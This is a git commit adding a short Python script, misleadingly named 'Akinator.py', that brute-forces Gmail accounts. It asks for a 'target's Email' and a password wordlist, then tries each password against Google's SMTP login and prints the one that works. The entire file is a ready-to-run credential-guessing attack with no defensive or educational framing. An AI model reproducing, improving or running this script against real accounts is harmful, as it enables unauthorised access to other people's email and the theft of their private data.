5719cfb392ce53f0d6335c86deea6c5a7f01f77a
lolo1428 <64350570+lolo1428@users.noreply.github.com>
2020-04-26 09:28:06 +0100

    Add files via upload

---
+++ Akinator.py
@@ -0,0 +1,23 @@
+#-*-coding:utf8;-*-
+#qpy:console
+
+import smtplib
+
+smtpserver= smtplib.SMTP("smtp.gmail.com",587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user= input ("Enter target's Email :")
+passwfile= input ("Enter password File :")
+passwfile= open(passwfile, "r")
+
+for password in passwfile :
+    try :
+        smtpserver.login(user, password)
+        print ("[✓] password found ===> ", password)
+        break ;
+        
+    except smtplib.SMTPAuthenticationError:
+        print ("[!] password  incorrect ===> ", password)
+        
+        
